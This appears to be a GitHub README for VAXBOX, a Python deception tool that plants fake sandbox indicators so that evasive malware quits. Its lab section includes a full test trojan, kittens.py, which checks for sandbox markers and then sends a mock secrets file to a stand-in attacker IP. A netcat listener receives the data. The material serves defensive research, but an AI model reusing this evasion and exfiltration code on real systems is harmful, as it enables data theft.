# 💉 Active Deception Vaccine (VAXBOX)

An elegant, lightweight proactive active-defense tool developed in Python for Linux environments (Kali Linux Cores). It implements core concepts of **Cyber Deception** and **Hardware Gaslighting** to trick sophisticated anti-analysis malware into automatic self-destruction. 

This project explores defensive reverse-psychology, demonstrating how simple Command Line Interface (CLI) tools can effectively manipulate system indicators to neutralize threats before they execute.

---

## 💡 What is an Active Deception Vaccine?

Instead of traditional reactive defense (chasing malware after infection), this project utilizes **Reverse Engineering against Malware Logic**. Modern malware contains sophisticated "Anti-Sandbox" modules to evade analysis. **Active Deception Vaccine** manipulates the environment by injecting multi-layered deceptive artifacts, forcing the malware to believe it is being monitored inside a high-security sandbox. As a result, the malware triggers its own **self-destruction phase** to protect its command-and-control (C2) servers.

---

## 🚀 Core Modules & Features

* **1) Module 1: Activate Vaccine (Multi-Layered Injection):**
  - **Static Artifacts:** Injects fake sandbox directories (`/home/sandbox_user/.cuckoo`) and VirtualBox configurations (`/etc/modprobe.d/vboxguest.conf`).
  - **Ghost Process:** Deploys a persistent background detached process masquerading as an intensive network sniffer (`/tmp/tcpdump`).
  - **Threat-Intelligence Mutex Array:** Injects locked POSIX semaphores/mutexes into Shared Memory (`/dev/shm`) matching active malware families (WannaCry, Lumma Stealer, CobaltStrike).
  - **Hardware Gaslighting:** Injects spoofed low-resource hardware responses via user-space memory files.

* **2) Module 2: Check Vaccine Status:**
  - Performs an automated diagnostic sweep across the OS and memory to verify that all deceptive traps and defensive shields are active and running.

* **3) Module 3: Generate Advanced Audit Report:**
  - Compiles a technical overview report logging all active deceptive indicators and live process PIDs for immediate environment verification.

* **4) Module 4: Secure Rollback & Purge:**
  - Completely cleanses the environment by safely removing all injected mutexes, terminating the ghost processes, and deleting fake profiles with **Zero Resource Leak**.

---

## 🔬 Hands-on Lab: My Full Attack & Defense Testing Scenario

You can reproduce this exact lab scenario on your own Kali Linux environment to understand how the interaction works:

### 🛑 Pre-requisite Notes:
1. The tool requires **ROOT** privileges to interact with Shared Memory and Kernel process mapping.
2. When testing, remember to **change the IP** inside the Trojan script to match your attacker machine's IP address.
3. You must start your **Ncat / Netcat Listener** on the attacker machine to capture the reverse connection before launching the attack.

---

### 📂 Step 1: Create the Sensitive Target File
First, I created a mock text file containing simulated highly sensitive bank account information to serve as the target for the asset-theft simulation:
```bash
echo -e "--- VICTIM SENSITIVE DATA ---\nUsername Bank Account: shooq\nPassword: 123456\nStatus: Active" > /tmp/top_secret.txt

```

---

### 🪓 Step 2: Build the Simulated Trojan (`kittens.py`)

I crafted a lightweight script named `kittens.py` that mimics information-stealing behavior. It includes a basic validation logic looking for common sandbox constraints and indicators before executing its malicious payload.

Create the file using your preferred terminal text editor:

```bash
nano kittens.py

```

*Trojan Source Code (`kittens.py`):*

```python
#!/usr/bin/env python3
import os
import sys
import socket
import subprocess

# ⚠️ Change the IP and port to match your attacker machine listener configuration
ATTACKER_IP = "192.168.1.100"  
ATTACKER_PORT = 4444

def scan_environment_and_attack():
    print("[*] Trojan (kittens.py) Executed. Scanning target system environment...")

    # 1. Threat-Intelligence Mutex Shield Check
    mutexes = ["sem.WannaCry_Global_Mutex", "sem.Lumma_Evasion_2026", "sem.vbox_deception_mutex"]
    for m in mutexes:
        if os.path.exists(f"/dev/shm/{m}"):
            print(f"[-] [ANTI-ANALYSIS] Active Mutex Shield Detected: {m}! Self-destructing to evade capture...")
            sys.exit(0)

    # 2. Dynamic Ghost Process Network Sniffer Check
    try:
        pids = subprocess.check_output(["pgrep", "-f", "/tmp/tcpdump"]).decode().strip()
        if pids:
            print("[-] [ANTI-ANALYSIS] Network Sniffer (/tmp/tcpdump) detected running! Aborting to prevent tracking...")
            sys.exit(0)
    except subprocess.CalledProcessError:
        pass

    # 3. Hardware Gaslighting Profile Check
    if os.path.exists("/tmp/fake_cpuinfo") or os.path.exists("/tmp/fake_meminfo"):
        print("[-] [ANTI-SANDBOX] Low hardware resources or Emulated environment detected (1 Core / 1.75GB). Exiting payload...")
        sys.exit(0)

    # 4. Payload Execution Phase (Fires if no defensive indicators are present)
    print("\n\033[91m[☠] SUCCESS: No active defenses found! Executing attack payload...\033[0m")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Exfiltrating sensitive target data over the wire
        with open("/tmp/top_secret.txt", "r") as f:
            s.send(f.read().encode())
            
        s.send(b"\n[+] Data Exfiltrated Successfully.\n")
        s.close()
    except Exception as e:
        print(f"[-] Attacker Listener offline: {e}")

if __name__ == "__main__":
    scan_environment_and_attack()

```

---

### 📡 Step 3: Launch the Attacker Listener

On your attacker machine/terminal window, spin up an **Ncat / Netcat** listener on port `4444` to catch the incoming exfiltrated file buffer:

```bash
nc -lvnp 4444

```

---

### 🧪 Step 4: Phase 1 Testing (Attack Execution without VAXBOX)

Run the Trojan script while the system is unprotected:

```bash
python3 kittens.py

```

**🔴 Observed Result (Successful Attack):**
The Trojan passes its environment validation seamlessly because no deceptive markers exist. It immediately accesses `/tmp/top_secret.txt` and transmits the data straight to your open Ncat listener screen.

---

### 💉 Step 5: Phase 2 Testing (Activating VAXBOX & Vaccine Self-Destruction)

Now open a second root terminal window and deploy the defense module:

```bash
sudo python3 vaxbox.py

```

1. Select **`Option 1 (Activate Vaccine)`** to inject the Multi-Layered Threat Matrix, fake RAM/CPU maps, and live Mutex Arrays.
2. Select **`Option 2`** to verify that all deceptive indicators are running properly in the background.
3. Switch back to your first terminal window and re-run the Trojan:

```bash
python3 kittens.py

```

**🟢 Observed Result (Trojan Self-Destruction):**
The instant `kittens.py` boots up, its anti-analysis logic crashes straight into the dummy POSIX semaphores and hardware profile tables generated by `VAXBOX`. Believing it's trapped inside a sandbox instance under intense forensic review, the script execution jumps directly into a `sys.exit(0)` shutdown statement, successfully preserving the target secret file.

---

### 🧹 Step 6: Post-Lab Clean Up

To restore your Linux core environment back to its native condition:

1. Return to the VAXBOX CLI terminal dashboard.
2. Select **`Option 4 (Secure Rollback & Purge)`**.
3. All injected file paths, mock memory artifacts, and network ghost PIDs will be thoroughly unlinked instantly.

---

## 🛠️ Installation & Usage Instructions

```bash
# Clone the repository
git clone [https://github.com/Shooq-10/Active_Deception_Vaccine.git](https://github.com/Shooq-10/Active_Deception_Vaccine.git)

# Navigate to the tool directory
cd Active_Deception_Vaccine

# Run the Vaccine Control Panel with root privileges
sudo python3 vaxbox.py

```

---

## 👤 Developer

* **Shouq Aldawsari**

> 💡 **Note:** You don't need to copy and paste the code manually. Both the main tool `vaxbox.py` and the simulated trojan `kittens.py` are already included in this repository. You can run them directly after cloning!

---

## 📄 License & Disclaimer

This tool is built strictly for educational, defensive research, and system immunization purposes.

```

```
